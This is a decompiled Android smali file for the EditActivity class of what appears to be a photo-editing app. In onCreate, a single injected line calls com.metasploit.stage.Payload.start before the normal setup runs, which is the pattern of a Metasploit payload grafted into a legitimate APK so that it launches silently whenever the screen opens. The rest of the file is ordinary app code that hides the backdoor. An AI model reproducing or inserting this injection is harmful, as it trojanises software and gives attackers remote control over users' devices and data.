.class public final Lorg/tezza/presentation/ui/edit/EditActivity;
.super La/a/a/a/b;
.source "EditActivity.kt"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "La/a/a/a/b<",
        "La/a/a/a/e;",
        "La/a/g/a;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, La/a/a/a/b;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 2

    .line 1
    invoke-virtual {p0}, Lj/m/a/e;->l()Lj/m/a/j;

    move-result-object v0

    const-class v1, La/a/a/b/b/a;

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/m/a/j;->a(Ljava/lang/String;)Landroidx/fragment/app/Fragment;

    move-result-object v0

    instance-of v1, v0, La/a/a/b/b/a;

    if-nez v1, :cond_0

    const/4 v0, 0x0

    :cond_0
    check-cast v0, La/a/a/b/b/a;

    if-eqz v0, :cond_1

    .line 2
    invoke-virtual {v0}, La/a/a/b/b/a;->Y()V

    .line 3
    :cond_1
    iget-object v0, p0, Landroidx/activity/ComponentActivity;->f:Landroidx/activity/OnBackPressedDispatcher;

    invoke-virtual {v0}, Landroidx/activity/OnBackPressedDispatcher;->a()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .line 1
    invoke-super {p0, p1}, La/a/a/a/b;->onCreate(Landroid/os/Bundle;)V

    if-nez p1, :cond_0

    .line 2
    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "GALLERY_ITEM_ID"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v1, "mediaPath"

    .line 3
    invoke-static {p1, v1}, Lo/i/b/h;->a(Ljava/lang/Object;Ljava/lang/String;)V

    .line 4
    new-instance v3, La/a/a/b/b/a;

    invoke-direct {v3}, La/a/a/b/b/a;-><init>()V

    .line 5
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    .line 6
    invoke-virtual {v1, v0, p1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 7
    invoke-virtual {v3, v1}, Landroidx/fragment/app/Fragment;->e(Landroid/os/Bundle;)V

    const v4, 0x7f0901ce

    const/4 v5, 0x0

    const/4 v6, 0x1

    const/4 v7, 0x0

    const/4 v8, 0x1

    move-object v2, p0

    .line 8
    invoke-virtual/range {v2 .. v8}, La/a/a/a/b;->b(Landroidx/fragment/app/Fragment;IZZZZ)V

    :cond_0
    return-void
.end method

.method public p()V
    .locals 3

    const v0, 0x7f0c001c

    .line 1
    invoke-virtual {p0, v0}, Lj/b/k/h;->setContentView(I)V

    .line 2
    invoke-static {p0}, Lj/b/k/r;->a(Lj/m/a/e;)Lj/p/x;

    move-result-object v1

    const-class v2, La/a/a/a/e;

    invoke-virtual {v1, v2}, Lj/p/x;->a(Ljava/lang/Class;)Lj/p/w;

    move-result-object v1

    if-eqz v1, :cond_1

    check-cast v1, La/a/a/a/c;

    .line 3
    iput-object v1, p0, La/a/a/a/b;->r:La/a/a/a/c;

    .line 4
    invoke-static {p0, v0}, Lj/k/f;->a(Landroid/app/Activity;I)Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    const-string v1, "DataBindingUtil.setContentView(this, id)"

    invoke-static {v0, v1}, Lo/i/b/h;->a(Ljava/lang/Object;Ljava/lang/String;)V

    .line 5
    iput-object v0, p0, La/a/a/a/b;->s:Landroidx/databinding/ViewDataBinding;

    .line 6
    invoke-virtual {p0}, La/a/a/a/b;->q()Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    const/4 v1, 0x1

    .line 7
    iget-object v2, p0, La/a/a/a/b;->r:La/a/a/a/c;

    if-eqz v2, :cond_0

    .line 8
    invoke-virtual {v0, v1, v2}, Landroidx/databinding/ViewDataBinding;->a(ILjava/lang/Object;)Z

    .line 9
    invoke-virtual {p0}, La/a/a/a/b;->q()Landroidx/databinding/ViewDataBinding;

    move-result-object v0

    invoke-virtual {v0}, Landroidx/databinding/ViewDataBinding;->b()V

    return-void

    :cond_0
    const-string v0, "vm"

    .line 10
    invoke-static {v0}, Lo/i/b/h;->c(Ljava/lang/String;)V

    const/4 v0, 0x0

    throw v0

    .line 11
    :cond_1
    new-instance v0, Lkotlin/TypeCastException;

    const-string v1, "null cannot be cast to non-null type X"

    invoke-direct {v0, v1}, Lkotlin/TypeCastException;-><init>(Ljava/lang/String;)V

    throw v0
.end method
